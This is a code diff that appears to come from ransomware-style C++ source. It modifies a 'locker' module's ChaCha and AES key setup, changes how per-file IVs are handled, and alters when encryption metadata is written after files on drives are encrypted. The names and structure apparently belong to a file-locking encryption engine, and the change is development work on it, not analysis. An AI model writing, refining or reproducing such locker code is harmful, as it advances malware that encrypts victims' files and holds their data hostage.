@@ -29,29 +29,21 @@ void chacha_block_fn(PFILE_INFO FileInfo, laced_ctx* ctx, u32* padding, BYTE* in
 
 static void HandlerGenKeyChaCha(laced_ctx* CryptCtx, CONST BYTE* ChaChaKey, CONST BYTE* ChaChaIV)
 {
-#ifdef _WIN32
-	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));
-#else
 	memory::memzero_explicit(CryptCtx, sizeof(laced_ctx));
-#endif
 	ECRYPT_keysetup(CryptCtx, ChaChaKey, 256, 64);
 	ECRYPT_ivsetup(CryptCtx, ChaChaIV);
 }
 
 static void HandlerGenKeyAES(crypto_aes_ctx* CryptCtx, CONST BYTE* AESKey)
 {
-#ifdef _WIN32
-	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));
-#else
 	memory::memzero_explicit(CryptCtx, sizeof(crypto_aes_ctx));
-#endif
 	aes_expandkey(CryptCtx, AESKey);
 }
 
 static bool SymmetricMethodState(PFILE_INFO FileInfo)
 {
 	if (FileInfo->crypt_info->gen_policy == GENKEY_EVERY_ONCE)
-		FileInfo->crypt_info->gen_key_method(FileInfo->ctx, GLOBAL_KEYS.g_Key, GLOBAL_KEYS.g_IV);
+		FileInfo->crypt_info->gen_key_method(FileInfo->ctx, GLOBAL_KEYS.g_Key, FileInfo->hblock->IV);
 
 	return FileInfo->crypt_info->mode_method(FileInfo);
 }
@@ -129,7 +121,7 @@ bool locker::CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info)
 			.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES,
 			.algo_method = (EncryptAlgoMethod)SymmetricMethodState,
 		};
-		crypt_info->gen_key_method(crypt_info->ctx, GLOBAL_KEYS.g_Key, GLOBAL_KEYS.g_IV);
+		crypt_info->gen_key_method(crypt_info->ctx, GLOBAL_KEYS.g_Key, NULL);
 		break;
 	}
 	case CryptoPolicy::CHACHA:
@@ -514,7 +506,7 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 
 void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
 {
-	if(success && !CommandParser::NOMETA)
+	if(success)
 		FileInfo->hblock->crypt ? 
 			filesystem::write_metadata(FileInfo)
 			:
